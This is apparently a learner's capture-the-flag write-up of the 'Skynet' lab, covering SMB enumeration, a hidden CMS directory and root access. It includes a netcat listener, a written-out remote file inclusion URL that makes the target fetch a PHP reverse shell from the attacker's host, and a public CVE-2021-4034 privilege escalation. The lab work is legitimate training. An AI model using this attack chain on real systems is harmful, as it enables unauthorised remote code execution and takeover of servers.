# Skynet
1. What is Miles password for his emails?
2. What is the hidden directory?
3. What is the vulnerability called when you can include a remote file for malicious purposes? (remote file inclusion)
4. What is the user flag?
5. What is the root flag?

- Enum for open ports first

![Pasted image 20251004193620.png](thm_pics/Pasted%20image%2020251004193620.png)

- ports 22, 80, 110, 139, 143, 445 are open, and its a linux server
- Now, lets access the website and use gobuster to enum for directories

![Pasted image 20251004194120.png](thm_pics/Pasted%20image%2020251004194120.png)

- What is squirrelmail?

![Pasted image 20251004194146.png](thm_pics/Pasted%20image%2020251004194146.png)

- theres a login panel here, first question asked "What is Miles password for his emails?" So we can try to find usernames in samba first since the service opens

![Pasted image 20251004200210.png](thm_pics/Pasted%20image%2020251004200210.png)

- using enum4linux, i found a user called **milesdyson**

![Pasted image 20251004205751.png](thm_pics/Pasted%20image%2020251004205751.png)

- and we can also **map shares in anonymous share**, lets try accessing it
- Command : `smbclient //10.10.40.60/anonymous -N`

![Pasted image 20251004210015.png](thm_pics/Pasted%20image%2020251004210015.png)

- to read a file, we need to download it to our local machine first using the `get` command: `get attention.txt`

![Pasted image 20251004210526.png](thm_pics/Pasted%20image%2020251004210526.png)

- Interesting, maybe we can also **list files in logs directory**

![Pasted image 20251004210643.png](thm_pics/Pasted%20image%2020251004210643.png)

- log2 and log3 have size 0, so we download log1.txt

![Pasted image 20251004210824.png](thm_pics/Pasted%20image%2020251004210824.png)

- Maybe one of these in the password for milesdyson's smb account? lets try

![Pasted image 20251004211400.png](thm_pics/Pasted%20image%2020251004211400.png)

- Its somehow not correct
- or we can just try brute forcing squirrelmail since the question asks for Mile's password for his squirrelmail account
- **cyborg007haloterminator** is the right one since its at the top of the log file
- Now next question asks "what is the hidden directory"

![Pasted image 20251004211949.png](thm_pics/Pasted%20image%2020251004211949.png)

- I saw that they changed the smb password for milesdyson (thats why we couldnt log in earlier!), lets try logging in by using smbclient and access miledyson's shares
- Command : `smbclient //10.10.40.60/milesdyson -U milesdyson`

![Pasted image 20251004212212.png](thm_pics/Pasted%20image%2020251004212212.png)

- traumaaa, i just learnt about neural networks this week
- So many pdfs tho, but theres "notes" directory

![Pasted image 20251004212922.png](thm_pics/Pasted%20image%2020251004212922.png)

- omg can i download all of these for my studies hahaha (kidding)
- lets see how "improtant.txt" looks like

![Pasted image 20251004213038.png](thm_pics/Pasted%20image%2020251004213038.png)

- beta CMS /45kra24zxs28v3yd?? whats that?
- and that is the hidden directory! so lets try accessing that directory on his website

![Pasted image 20251004213212.png](thm_pics/Pasted%20image%2020251004213212.png)

- hi miles dyson, nice to meet you
- now, lets try gobuster on his directory cuz why not?

![Pasted image 20251004214837.png](thm_pics/Pasted%20image%2020251004214837.png)


![Pasted image 20251004214823.png](thm_pics/Pasted%20image%2020251004214823.png)

- found Cuppa CMS
- well i tried username : milesdyson and password : cyborg007haloterminator but its wrong
- also, i tried password : )s{A&2Z=F^n_E.B` in ssh login also but its wrong
- I will try to find exploits related to cuppa cms

![Pasted image 20251004220929.png](thm_pics/Pasted%20image%2020251004220929.png)

![Pasted image 20251004220939.png](thm_pics/Pasted%20image%2020251004220939.png)

- yeah its related to remote file inclusion, so i think this is the right one
- This lets the attacker do LFI and RFI

![Pasted image 20251004221111.png](thm_pics/Pasted%20image%2020251004221111.png)

![Pasted image 20251004221132.png](thm_pics/Pasted%20image%2020251004221132.png)

- so i have to access the alertConfigField thing, now i will try using gobuster to find directories inside administrator panel

![Pasted image 20251004221525.png](thm_pics/Pasted%20image%2020251004221525.png)

- yeah theres **/alerts**, i will keep that in mind
- I will also prepare the **php reverse shell** file
- I think i will try RFI and host a **simple http server** in the directory that has the php reverse shell
- First, i will set up a simple listener using : `nc -lvnp 1234`
- Exploit RFI : `http://10.10.40.60/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.23.125.244/php-reverse-shell.php?`

![Pasted image 20251004223141.png](thm_pics/Pasted%20image%2020251004223141.png)

- omg it works! this is my first time doing RFI im so amazed 
- now, lets try to find the user flag

![Pasted image 20251004223440.png](thm_pics/Pasted%20image%2020251004223440.png)

- Found user.txt!
- Now, lets try privilege escalation

![Pasted image 20251004223550.png](thm_pics/Pasted%20image%2020251004223550.png)

- lets try psexec again
- So i got the exploit from https://github.com/arthepsy/CVE-2021-4034 github and used wget to get the file from our attacking machine 
- I downloaded the file in /tmp directory of the target
- Then, i compiled the c file there (followed the steps in that github repo)
- Then, i executed the object file

![Pasted image 20251004225513.png](thm_pics/Pasted%20image%2020251004225513.png)

- now im root, lets find the root.txt file

![Pasted image 20251004225834.png](thm_pics/Pasted%20image%2020251004225834.png)

- got the flag!